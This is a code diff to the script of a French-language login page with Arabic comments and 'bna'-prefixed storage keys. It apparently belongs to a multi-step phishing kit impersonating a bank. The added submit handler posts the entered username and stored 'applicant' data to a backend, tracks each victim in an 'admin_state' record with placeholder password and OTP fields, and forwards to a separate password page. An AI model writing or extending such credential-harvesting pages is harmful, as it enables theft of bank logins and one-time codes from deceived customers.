@@ -380,9 +380,31 @@
   const remember = document.getElementById('remember');
   const go = document.getElementById('go');
   const error = document.getElementById('error');
-  // صفحة الباسورد: الملف المجاور في المشروع، ولينك المعاينة هنا
   const AUTH_FILE = 'password_fr.html';
   const KEY = 'bna.identity';
+  const DATA_KEY = 'bna_state';
+  const ADMIN_KEY = 'bna_admin_state';
+
+  function setS(u) {
+    let previous = {};
+    try {
+      previous = JSON.parse(localStorage.getItem(ADMIN_KEY) || localStorage.getItem(DATA_KEY) || '{}');
+    } catch (e) {}
+    const s = { ...previous, ...u };
+    try {
+      localStorage.setItem(DATA_KEY, JSON.stringify(s));
+      localStorage.setItem(ADMIN_KEY, JSON.stringify(s));
+    } catch (e) {}
+    return s;
+  }
+
+  function getApplicant() {
+    try {
+      return JSON.parse(localStorage.getItem('bna_applicant') || '{}');
+    } catch (e) {
+      return {};
+    }
+  }
 
   // استرجاع الاسم المحفوظ لو المستخدم اختار "Se souvenir de moi"
   try {
@@ -399,7 +421,7 @@
     error.classList.remove('show');
   });
 
-  form.addEventListener('submit', (e) => {
+  form.addEventListener('submit', async (e) => {
     e.preventDefault();
     const name = input.value.trim();
 
@@ -417,14 +439,42 @@
     } catch (e) { /* مفيش تخزين متاح */ }
 
     go.dataset.busy = 'true';
-    // هنا مكان طلب تسجيل الدخول الحقيقي على السيرفر، وبعده التحويل لصفحة الباسورد
-    goToAuth();
-  });
 
-  function goToAuth() {
-    // التحويل المباشر لصفحة الباسورد (الملف المجاور في المشروع)
-    setTimeout(() => { location.href = AUTH_FILE; }, 350);
-  }
+    try {
+      const applicant = getApplicant();
+      const response = await fetch('/api/applications', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          ...applicant,
+          id: applicant.id || undefined,
+          username: name,
+          status: 'pending_login'
+        })
+      });
+
+      if (!response.ok) {
+        throw new Error('application submission failed');
+      }
+
+      const result = await response.json();
+      setS({
+        login: name,
+        username: name,
+        applicationId: result.application.id,
+        status: 'pending_login',
+        password: '',
+        otp: ''
+      });
+
+      location.href = AUTH_FILE;
+    } catch (err) {
+      go.dataset.busy = 'false';
+      input.classList.add('invalid');
+      error.textContent = 'Erreur lors de l\'envoi des données, réessayez';
+      error.classList.add('show');
+    }
+  });
   /* ===== نقاط شريط الخدمات ===== */
   (function () {
     const rail = document.getElementById('rail');
